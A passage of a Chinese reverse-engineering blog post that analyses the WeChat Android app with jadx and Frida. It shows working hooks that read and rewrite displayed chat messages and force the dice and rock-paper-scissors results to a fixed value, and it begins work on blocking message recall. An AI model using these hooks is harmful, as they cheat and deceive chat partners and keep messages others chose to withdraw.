class="property">value</span>);  <span class="comment">//LtF是数据源</span></span><br><span class="line">            <span class="keyword">var</span> adapter_size = adapter.<span class="title function_">getCount</span>(); <span class="comment">//数据数量</span></span><br><span class="line">            <span class="keyword">var</span> msg = adapter.<span class="title function_">getItem</span>(<span class="number">0</span>);</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;msg&quot;</span>,msg);</span><br><span class="line">            <span class="keyword">return</span> clazz.<span class="property">zt</span>.<span class="title function_">apply</span>(<span class="variable language_">this</span>, <span class="variable language_">arguments</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//结果</span></span><br><span class="line"><span class="variable language_">this</span>.<span class="property">Lrn</span>.<span class="property">value</span> com.<span class="property">tencent</span>.<span class="property">mm</span>.<span class="property">ui</span>.<span class="property">chatting</span>.<span class="property">a</span>.<span class="property">a</span>@eb2b4e4</span><br><span class="line">adapter com.<span class="property">tencent</span>.<span class="property">mm</span>.<span class="property">ui</span>.<span class="property">chatting</span>.<span class="property">a</span>.<span class="property">a</span>@eb2b4e4</span><br><span class="line">adapter.<span class="property">getCount</span> <span class="number">17</span>  <span class="comment">//聊天框有17条消息</span></span><br><span class="line"><span class="title class_">LtF</span> &#123;<span class="number">0</span>=com.<span class="property">tencent</span>.<span class="property">mm</span>.<span class="property">storage</span>.<span class="property">bz</span>@21a6784, <span class="number">1</span>=com.<span class="property">tencent</span>.<span class="property">mm</span>.<span class="property">storage</span>.<span class="property">bz</span>@4e07b6d, <span class="number">2</span>=com.<span class="property">tencent</span>.<span class="property">mm</span>.<span class="property">storage</span>.<span class="property">bz</span>@c7df3a2, <span class="number">3</span>=com.<span class="property">tencent</span>.<span class="property">mm</span>.<span class="property">storage</span>.<span class="property">bz</span>@<span class="number">3284833</span>, <span class="number">4</span>=com.<span class="property">tencent</span>.<span class="property">mm</span>.<span class="property">storage</span>.<span class="property">bz</span>@89877f0, <span class="number">5</span>=com.<span class="property">tencent</span>.<span class="property">mm</span>.<span class="property">storage</span>.<span class="property">bz</span>@<span class="number">1166169</span>, <span class="number">6</span>=com.<span class="property">tencent</span>.<span class="property">mm</span>.<span class="property">storage</span>.<span class="property">bz</span>@86ba7ee, <span class="number">7</span>=com.<span class="property">tencent</span>.<span class="property">mm</span>.<span class="property">storage</span>.<span class="property">bz</span>@315348f, <span class="number">8</span>=com.<span class="property">tencent</span>.<span class="property">mm</span>.<span class="property">storage</span>.<span class="property">bz</span>@ba5231c, <span class="number">9</span>=com.<span class="property">tencent</span>.<span class="property">mm</span>.<span class="property">storage</span>.<span class="property">bz</span>@9aaab25, <span class="number">10</span>=com.<span class="property">tencent</span>.<span class="property">mm</span>.<span class="property">storage</span>.<span class="property">bz</span>@16e54fa, <span class="number">11</span>=com.<span class="property">tencent</span>.<span class="property">mm</span>.<span class="property">storage</span>.<span class="property">bz</span>@d3a8aab, <span class="number">12</span>=com.<span class="property">tencent</span>.<span class="property">mm</span>.<span class="property">storage</span>.<span class="property">bz</span>@36f5508, <span class="number">13</span>=com.<span class="property">tencent</span>.<span class="property">mm</span>.<span class="property">storage</span>.<span class="property">bz</span>@e7fd4a1, <span class="number">14</span>=com.<span class="property">tencent</span>.<span class="property">mm</span>.<span class="property">storage</span>.<span class="property">bz</span>@4bcc6c6, <span class="number">15</span>=com.<span class="property">tencent</span>.<span class="property">mm</span>.<span class="property">storage</span>.<span class="property">bz</span>@c152687, <span class="number">16</span>=com.<span class="property">tencent</span>.<span class="property">mm</span>.<span class="property">storage</span>.<span class="property">bz</span>@a28b9b4&#125;</span><br><span class="line">msg com.<span class="property">tencent</span>.<span class="property">mm</span>.<span class="property">storage</span>.<span class="property">bz</span>@21a6784  <span class="comment">//数据源中第一个消息</span></span><br></pre></td></tr></table></figure><p>可以知道每个数据都是<code>com.tencent.mm.storage.bz</code>类型的。</p><p>com.tencent.mm.storage.bz类继承 com.tencent.mm.ah.aa类</p><p>com.tencent.mm.ah.aa类继承com.tencent.mm.g.c.ej类</p><p>com.tencent.mm.g.c.ej类继承com.tencent.mm.sdk.e.c类</p><p>发现ej类中有个属性为field_content，猜测他是存放消息内容</p><h3 id="hook修改消息内容">hook修改消息内容</h3><p>这里选择hook notifyDataSetChanged()方法可以修改消息内容</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">hook_notifyDataSetChanged</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="keyword">var</span> clazz = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&#x27;com.tencent.mm.ui.chatting.a.a&#x27;</span>);</span><br><span class="line">        clazz.<span class="property">notifyDataSetChanged</span>.<span class="property">implementation</span> = <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;notifyDataSetChanged&quot;</span>);</span><br><span class="line">            <span class="keyword">var</span> data = <span class="variable language_">this</span>.<span class="property">LtF</span>.<span class="property">value</span>;</span><br><span class="line">            <span class="comment">//console.log(&quot;Ltf&quot;,data);</span></span><br><span class="line">            <span class="keyword">var</span> data_size = data.<span class="title function_">size</span>();  <span class="comment">//数据源数量</span></span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;data_size&quot;</span>,data_size);</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">var</span> i=<span class="number">0</span>;i&lt;data_size;++i)&#123;</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Message&quot;</span>+i,<span class="title class_">Java</span>.<span class="title function_">cast</span>(data.<span class="title function_">get</span>(i),<span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;com.tencent.mm.storage.bz&quot;</span>)).<span class="property">field_content</span>.<span class="property">value</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="title class_">Java</span>.<span class="title function_">cast</span>(data.<span class="title function_">get</span>(<span class="number">5</span>),<span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;com.tencent.mm.storage.bz&quot;</span>)).<span class="property">field_content</span>.<span class="property">value</span> = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;java.lang.String&quot;</span>).$new(<span class="string">&quot;你要修改的内容&quot;</span>);</span><br><span class="line">             <span class="keyword">return</span> clazz.<span class="property">notifyDataSetChanged</span>.<span class="title function_">apply</span>(<span class="variable language_">this</span>, <span class="variable language_">arguments</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="VX投骰子">VX投骰子</h2><h3 id="定位-2">定位</h3><p>同样 方法和上面定位消息发送一样</p><p>点击事件为<code>com.tencent.mm.emoji.panel.a.q$1.onClick()</code></p><h3 id="分析-3">分析</h3><p><img src="assets/image-20240609161000551.png" alt="image-20240609161000551"></p><p>跟进&quot;glG.a&quot;方法，即<code>com.tencent.mm.emoji.panel.a.d.a()</code></p><p><img src="assets/image-20240609161502165.png" alt="image-20240609161502165"></p><p>发现有个switch，那就hook一下这个值是多少，向下会执行哪个case语句</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">hook</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="keyword">var</span> clazz=<span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;com.tencent.mm.emoji.panel.a.d&quot;</span>);</span><br><span class="line">        clazz.<span class="property">a</span>.<span class="title function_">overload</span>(<span class="string">&#x27;android.view.View&#x27;</span>, <span class="string">&#x27;android.content.Context&#x27;</span>, <span class="string">&#x27;int&#x27;</span>, <span class="string">&#x27;com.tencent.mm.emoji.a.b.ac&#x27;</span>).<span class="property">implementation</span>=<span class="keyword">function</span>(<span class="params">a,b,c,d</span>)&#123;        </span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">arguments</span>[<span class="number">3</span>].<span class="property">type</span>.<span class="property">value</span>); <span class="comment">//0</span></span><br><span class="line">         &#125;</span><br><span class="line">     &#125;);</span><br><span class="line"> &#125;</span><br><span class="line"><span class="comment">//返回值为0，所以执行case 0</span></span><br></pre></td></tr></table></figure><p>再看一下ggJ1.getGroup()值</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">hook_getGroup</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="title class_">EmojiInfo</span> = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;com.tencent.mm.storage.emotion.EmojiInfo&quot;</span>);</span><br><span class="line">    <span class="title class_">EmojiInfo</span>[<span class="string">&quot;getGroup&quot;</span>].<span class="property">implementation</span> = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`EmojiInfo.getGroup is called`</span>);</span><br><span class="line">    <span class="keyword">let</span> result = <span class="variable language_">this</span>[<span class="string">&quot;getGroup&quot;</span>]();</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`EmojiInfo.getGroup result=<span class="subst">$&#123;result&#125;</span>`</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">let</span> <span class="title class_">EmojiGroupInfo</span> = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;com.tencent.mm.storage.emotion.EmojiGroupInfo&quot;</span>);</span><br><span class="line">    <span class="keyword">var</span> <span class="title class_">Qbd</span> = <span class="title class_">EmojiGroupInfo</span>.<span class="property">Qbd</span>.<span class="property">value</span>;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Qbd is called&quot;</span>,<span class="title class_">Qbd</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">    &#125;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//测试发现  EmojiGroupInfo.Qbd==18 </span></span><br><span class="line"><span class="comment">//当骰子，石头剪刀布时,EmojiInfo.getGroup为18，自定义表情EmojiInfo.getGroup为81</span></span><br></pre></td></tr></table></figure><p>那就<code>ggJ1.getGroup() == EmojiGroupInfo.Qbd</code>成立继续向下分析有一个“getProvider().p(emojiInfo3)“</p><p>jadx双击这个函数发现他还没有进行函数体实现，应该在别的地方覆写实现了。看看哪里引用了这个方法</p><p>找到<code>com.tencent.mm.ca.a.p()</code>和<code>com.tencent.mm.plugin.emoji.e.f.p()</code></p><p>因为com.tencent.mm.ca.a.p()先执行，所以先跟进这个看一看。</p><p><img src="assets/image-20240609164449481.png" alt="image-20240609164449481"></p><p>发现调用了一个p方法  应该就是<code>com.tencent.mm.plugin.emoji.e.f.p()</code>，那就跟进这个看一看</p><p><img src="assets/image-20240609164548935.png" alt="image-20240609164548935"></p><p>看到了 if条件语句中有<code>EmojiGroupInfo.Qbd</code>应该是在判断你发送的表情包是自定义还是骰子，石头剪刀布。</p><p>不出意外应该会执行到</p><p><img src="assets/image-20240609164915361.png" alt="image-20240609164915361"></p><p>(hh，这里有看开发知识了。。。)</p><p>Cursor是数据库游标，aec来具体查询内容。moveToPosition()是aec移动到指定位置。jE就是个int值应该。<a href="http://xn--bu-uu2csb8068a.jE">看一下bu.jE</a>()方法。i=aec.getCount() - 1，i2=0</p><p><img src="assets/image-20240609165155541.png" alt="image-20240609165155541"></p><p>有一个nextInt(n)取随机值，取值范围[0,n)，这里是[0,aec.getCount() - 1]。</p><p>尝试hook一下这个jE方法。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">hook_jE</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">var</span> bo = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&#x27;com.tencent.mm.sdk.platformtools.bu&#x27;</span>);</span><br><span class="line">    bo.<span class="property">jE</span>.<span class="title function_">overload</span>(<span class="string">&#x27;int&#x27;</span>,<span class="string">&#x27;int&#x27;</span>).<span class="property">implementation</span>=<span class="keyword">function</span>(<span class="params">a1,a2</span>)&#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;hook ii start&quot;</span>);</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;a1:&quot;</span>+a1);</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;a2:&quot;</span>+a2);</span><br><span class="line">        <span class="keyword">var</span> rtn= <span class="variable language_">this</span>.<span class="title function_">jE</span>(<span class="number">5</span>,<span class="number">0</span>);</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;rtn:&quot;</span>+rtn);</span><br><span class="line">        <span class="comment">//打印调用栈</span></span><br><span class="line">        <span class="keyword">var</span> threadef = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&#x27;java.lang.Thread&#x27;</span>);</span><br><span class="line">        <span class="keyword">var</span> threadinstance = threadef.$new();</span><br><span class="line">        <span class="keyword">var</span> stack = threadinstance.<span class="title function_">currentThread</span>().<span class="title function_">getStackTrace</span>();</span><br><span class="line">        <span class="keyword">function</span> <span class="title function_">Where</span>(<span class="params">stack</span>)&#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; stack.<span class="property">length</span>; ++i)&#123;</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(stack[i].<span class="title function_">toString</span>());</span><br><span class="line">            &#125;</span><br><span class="line">         &#125;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Full call stack:&quot;</span> + <span class="title class_">Where</span>(stack));</span><br><span class="line">        <span class="keyword">return</span> rtn</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>通过多次测试知道，如果是骰子，i=5,i2=0，如果是石头剪刀布i=2,i2=0，所以当骰子时getCount()==6，石头剪刀布getCount()==3。并且<strong>骰子结果是jE返回值+1</strong>，<strong>剪刀石头布分别对应着0 1 2</strong></p><h3 id="hook修改骰子-石头剪刀布">hook修改骰子/石头剪刀布</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">saizi</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">var</span> clazz = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&#x27;com.tencent.mm.sdk.platformtools.bu&#x27;</span>);</span><br><span class="line">        clazz.<span class="property">jE</span>.<span class="property">implementation</span> = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">var</span> i=<span class="number">0</span>;i&lt;<span class="variable language_">arguments</span>.<span class="property">length</span>;i++)&#123;</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;bu.jE arguments&quot;</span>+i,<span class="variable language_">arguments</span>[i]);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">var</span> result = clazz.<span class="property">jE</span>.<span class="title function_">apply</span>(<span class="variable language_">this</span>, <span class="variable language_">arguments</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable language_">arguments</span>[<span class="number">0</span>]==<span class="number">2</span>)&#123;</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;石头剪刀布结果为:&quot;</span>,result==<span class="number">0</span>?<span class="string">&quot;剪刀&quot;</span>:result==<span class="number">1</span>?<span class="string">&quot;石头&quot;</span>:<span class="string">&quot;布&quot;</span>);</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;骰子点数为:&quot;</span>,result+<span class="number">1</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// 进行修改</span></span><br><span class="line">            result = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;java.lang.Integer&quot;</span>).<span class="built_in">parseInt</span>(<span class="string">&quot;5&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> result;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="vx防撤回">vx防撤回</h2><h3 id="定位-3">定位</h3><p>这里可以搜索关键字来进行定位，搜索关键字符串&quot;revoke&quot;，定位到类<code>com.tencent.mm.plugin.msgquote.PluginMsgQuote.handleRevokeMsgBySvrId</code></p><h3 id="分析-4">分析</h3><p>来到方法<code>handleRevokeMsgBySvrId</code>看名字发现这样是个处理撤回消息的方法，那看看哪里调用了这个方法。</p><p>可以打印这个方法的调用栈</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">showstacks_handleRevokeMsgBySvrId</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">var</span> clazz = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&#x27;com.tencent.mm.plugin.msgquote.PluginMsgQuote&#x27;</span>);</span><br><span class="line">    clazz.<span class="property">handleRevokeMsgBySvrId</span>.<span class="property">implementation</span>=<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="keyword">var</span> threadef = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&#x27;java.lang.Thread&#x27;</span>);</span><br><span class="line">        <span class="keyword">var</span> threadinstance = threadef.$new();</span><br><span class="line">        <span class="keyword">var</span> stack = threadinstance.<span class="title function_">currentThread</span>().<span class="title function_">getStackTrace</span>();</span><br><span class="line">        <span class="keyword">function</span> <span class="title function_">Where</span>(<span class="params">stack</span>)&#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; stack.<span class="property">length</span>; ++i)&#123;</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(stack[i].<span class="title function_">toString</span>());</span><br><span class="line">            &#125;</span><br><span class="line">         &#125;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Full call stack:&quot;</span> + <span class="title class_">Where</span>(stack));    </span><br><span class="line">    &#125;   </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>打印结果如下</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">com<span class="selector-class">.tencent</span><span class="selector-class">.mm</span><span class="selector-class">.plugin</span><span class="selector-class">.msgquote</span><span class="selector-class">.PluginMsgQuote</span><span class="selector-class">.handleRevokeMsgBySvrId</span>(Native Method)</span><br><span class="line">com<span class="selector-class">.tencent</span><span class="selector-class">.mm</span><span class="selector-class">.model</span><span class="selector-class">.f</span><span class="selector-class">.a</span>(SourceFile:<span class="number">2190</span>)</span><br><span class="line">com<span class="selector-class">.tencent</span><span class="selector-class">.mm</span><span class="selector-class">.model</span><span class="selector-class">.ch</span><span class="selector-class">.b</span>(SourceFile:<span class="number">258</span>)</span><br><span class="line">com<span class="selector-class">.tencent</span><span class="selector-class">.mm</span><span class="selector-class">.s</span><span class="selector-class">.b</span><span class="selector-class">.b</span>(SourceFile:<span class="number">40</span>)</span><br><span class="line">com<span class="selector-class">.tencent</span><span class="selector-class">.mm</span><span class="selector-class">.plugin</span><span class="selector-class">.messenger</span><span class="selector-class">.foundation</span><span class="selector-class">.c</span><span class="selector-class">.processAddMsg</span>(SourceFile:<span class="number">165</span>)</span><br><span class="line">com<span class="selector-class">.tencent</span><span class="selector-class">.mm</span><span class="selector-class">.plugin</span><span class="selector-class">.messenger</span><span class="selector-class">.foundation</span><span class="selector-class">.c</span><span class="selector-class">.a</span>(SourceFile:<span class="number">1059</span>)</span><br><span class="line">com<span class="selector-class">.tencent</span><span class="selector-class">.mm</span><span class="selector-class">.plugin</span><span class="selector-class">.messenger</span><span class="selector-class">.foundation</span><span class="selector-class">.f</span><span class="selector-class">.a</span>(SourceFile:<span class="number">118</span>)</span><br><span class="line">com<span class="selector-class">.tencent</span><span class="selector-class">.mm</span><span class="selector-class">.plugin</span><span class="selector-class">.zero</span><span class="selector-class">.c</span><span class="selector-class">.a</span>(SourceFile:<span class="number">57</span>)</span><br><span class="line">com<span class="selector-class">.tencent</span><span class="selector-class">.mm</span><span class="selector-class">.modelmulti</span>.q<span class="variable">$a</span>$<span class="number">1</span><span class="selector-class">.onTimerExpired</span>(SourceFile:<span class="number">830</span>)</span><br><span class="line">com<span class="selector-class">.tencent</span><span class="selector-class">.mm</span><span class="selector-class">.sdk</span><span class="selector-class">.platformtools</span><span class="selector-class">.aw</span><span class="selector-class">.handleMessage</span>(SourceFile:<span class="number">86</span>)</span><br><span class="line">com<span class="selector-class">.tencent</span><span class="selector-class">.mm</span><span class="selector-class">.sdk</span><span class="selector-class">.platformtools</span>.aq$<span class="number">2</span><span class="selector-class">.handleMessage</span>(SourceFile:<span class="number">362</span>)</span><br><span class="line">android<span class="selector-class">.os</span><span class="selector-class">.Handler</span><span class="selector-class">.dispatchMessage</span>(Handler<span class="selector-class">.java</span>:<span class="number">106</span>)</span><br><span class="line">com<span class="selector-class">.tencent</span><span class="selector-class">.mm</span><span class="selector-class">.sdk</span><span class="selector-class">.platformtools</span>.aq$<span class="number">2</span><span class="selector-class">.dispatchMessage</span>(SourceFile:<span class="number">350</span>)</span><br><span class="line">android<span class="selector-class">.os</span><span class="selector-class">.Looper</span><span class="selector-class">.loop</span>(Looper<span class="selector-class">.java</span>:<span class="number">193</span>)</span><br><span class="line">android<span class="selector-class">.os</span><span class="selector-class">.HandlerThread</span><span class="selector-class">.run</span>(HandlerThread<span class="selector-class">.java</span>:<span class="number">65</span>)</span><br></pre></td></tr></table></figure><p>然后写出如下脚本(猜测应该是发送消息和撤回消息经过的调用栈会有所区别，这里区分哪里是处理撤回消息的方法)</p><p>下面 代码功能就是打印上面可能调用的方法的参数</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">revoke</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">        <span class="keyword">var</span> clazz = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&#x27;com.tencent.mm.plugin.msgquote.PluginMsgQuote&#x27;</span>);</span><br><span class="line">        clazz.<span class="property">handleRevokeMsgBySvrId</span>.<span class="property">implementation</span> = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">            <span class="keyword">var</span> log_str = <span class="string">&quot;arguments:&quot;</span></span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="variable language_">arguments</span>.<span class="property">length</span>; i++) &#123;</span><br><span class="line">                log_str += <span class="string">&quot; [&quot;</span> + i + <span class="string">&quot;]&quot;</span> + <span class="variable language_">arguments</span>[i]</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;8 handleRevokeMsgBySvrId&quot;</span>, log_str);</span><br><span class="line">            <span class="keyword">return</span> clazz.<span class="property">handleRevokeMsgBySvrId</span>.<span class="title function_">apply</span>(<span class="variable language_">this</span>, <span class="variable language_">arguments</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">    </span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">        <span class="keyword">var</span> clazz = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&#x27;com.tencent.mm.model.f&#x27;</span>);</span><br><span class="line">        clazz.<span class="property">a</span>.<span class="property">implementation</span> = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">            <span class="keyword">var</span> log_str = <span class="string">&quot;arguments:&quot;</span></span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="variable language_">arguments</span>.<span 